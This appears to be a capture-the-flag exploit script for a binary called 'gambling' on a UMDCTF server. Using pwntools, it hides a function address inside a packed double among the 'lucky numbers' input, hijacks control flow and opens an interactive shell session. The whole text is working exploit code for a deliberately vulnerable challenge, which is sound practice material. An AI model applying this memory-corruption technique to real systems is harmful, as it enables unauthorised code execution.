from pwn import *

#p = process('./gambling')
p = remote("challs.umdctf.io",31005)
elf = context.binary = ELF("./gambling")

#gdb.attach(p,gdbscript="""
#            break *0x08049331
#            break  *0x08049393
#           """)
context.log_level = "debug"

money = 0x080492c0
# double
magic = struct.unpack('d', b'\x00\x00\x00\x00' + p32(money))[0]

payload = [
    b'2.1',
    b'2.2',
    b'3.3',
    b'4.4',
    b'5.5',
    b'0.0',
    str(magic).encode(),
]

print(f"{magic}")
print(f"{struct.pack("f",magic)}")
print(payload)
p.sendlineafter(b"Enter your lucky numbers: ", b' '.join(payload))
p.interactive()
